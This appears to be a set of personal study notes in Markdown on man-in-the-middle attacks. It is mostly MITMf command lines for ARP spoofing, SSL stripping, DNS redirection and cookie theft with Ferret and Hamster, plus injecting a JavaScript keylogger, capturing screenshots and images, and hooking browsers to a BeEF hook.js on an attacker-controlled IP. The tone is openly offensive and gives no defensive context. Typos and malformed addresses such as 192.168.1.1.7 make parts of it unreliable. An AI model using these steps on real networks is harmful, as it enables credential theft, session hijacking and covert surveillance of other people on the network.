# MAN IN THE MIDDLE ATTACKS

1. Gather information about the connected clients.
2. Understanding ARP
3. Understanding Man In Middle Attack

## Gather information about the client**

- Specify the manufacture company of the client devece.
- Discovering thier MAC IP addresses.
- Discovering their operating system.

***Netdiscover:** Is a network address discovering tool that was developed mainly for those wireless networks, IT send ARP REQUEST and SNIFFS for replaces.*

`netdiscover -i wlan0 -r 192.168._._`

Check router default getway address, `route -n`
Check wifi card name, `iwconfig`

***Zenmap:** Is the network discovery tool that can be used to get detailed information (client, network, target) on the internet. Zenmap is the of clal nmap security scanner GUI. It is a multi-platfrom such as Linux, Windows and Mac os.*

**Scap Type:**

- *Ping Scan:* Showing us the connected clients.
- *Quick Scan:* Showing us more details such as MAC address and the ports.
- *Quick Scan Plus:* Showing us the operating system and the ports and the name service of the port and the version.

## Address Resulation Protocol (ARP)

ARP is a network leayer protocol used to convert an IP address into a physical address.

*ARP is used to link out IP address to our ethernet address.*

**ARP security issue:**

1. Clients can accept a response even if they did not send a request.
2. Each ARP request or response is trusted.

**ARP SPOONG:** ARP Spooing is a type of attack in which a maliious actor sends falsied arp messages over a tocal area network.

- Sending ARP response to the client tells him I AM THE ROUTER.
- Sending ARP Request to the router tells him I AM THE CLIETNS.
- This will help us to poison the client ARP TABLE and put inside of router MAC address our MAC address.

**Capturing Login information using MITM**

*MITMf* is a comprehensive suite for Man In The Middle Attacks.

`mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.1.7 -i wlan0/eth0`

**Bypassing SSL Encryption Using SSLStrip**

`echo 1 > /proc/sys/net/ipv4/ip_forward`

`mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.1.7 -i wlan0/eth0 >> /root/Documents
test.txt`

**Regirect Client From To Website**

*DNS - is a server translate all the domain to an IP address.*

Run apache server first.

`service apache2 start`

The we will locate using this command, where is *mitmf.conf* file.

`locate mitmf.conf`

`/etc/mitmf/mitmf.conf`

Edit mitmf.conf file.

`nono /etc/mitmf/mitmf.conf`

We will go **[[[A]]]** records and add out index page.

`*.live.com=192.168.1.34`

`mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.1.7 -i wlan0/eth0 --dns`

**Stealing The Cookies**

**Cookies** are usually small text LES, given ID tags that are stored on your browers directory or program data subfolders.

- Stealing the cookies from the target browser.
- Inject the captured cookies into our borwser.
- Method is not working whth the websites that's uses HTTPS connection.
- We can bypass this issue by DOWNGRADING the connection from https to http ;) .

Tools:

*Ferret - Side Jack* to steal the cookies from the target browser.
*Hamster* To inject the captured cookies into our browser.

Run *mitmf*

`mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.31.7 -i wlan0`

Then run *ferret*

`ferret -i wlan0`

After run *hamster*. Its a browser interface tool. We have to setting it. Open brower and go to *Preferences > Network Proxy* settings.

Choose *Manual proxy configuration* and Set HTTP Proxy 127.0.0.1 and Port 1234.

Then go to 127.0.0.1:1234 and you will get all the cookies and you know how to use it ;).

**Capture screen short of the target client**

`mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.31.7 -i wlan0 --screen`

**Inject a keylogger into the target browser**

`mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.31.7 -i wlan0 --jskeylogger`

`mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.31.7 -i wlan0 --jskeylogger >> /roor/jslogger.txt`

**Capturing Images From Network Traffic**

**DRIFTNET** watches network traffic and packs out and displays JPEG and GIF images form display. It is a horric invasion of privacy and should not be used by anyone anywher.

- Poisoning the arp table of the target device using (MITMF or ARPSPOOF)
- Using DRIFTNET to capture the images.

`mitmf --arp --spoof --gateway 192.168.31.1 --target 192.168.31.7 -i wlan0`

`driftnet -i eth0/wlan0`

**Inject HTML File And IP The Images in The Browser**

1. Flipping the images 180 degree in the target browser.
	- `--upsidedownternet`
2. Inject HTMP file into the target browser.
	- `--inject ` and `--html-file`
3. Inject any sentence or any word.
4. Or Inject enter website into the target browser.

`mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.7 -i wlan0 --upsidedownternet`

`mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.7 -i wlan0 --inject --html-file /root/Documents/file_name.html`

## INJECT JAVASCRIPT URL AND HOOKING CLIENT'S WITH BEEF

**Beef** is short for the Browser Exploitation Framework. It is a penetration testing tool the focuses on the web browser.

`mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.7 -i wlan0 --inject --js-url http://192.168.1.107:3000/hook.js`
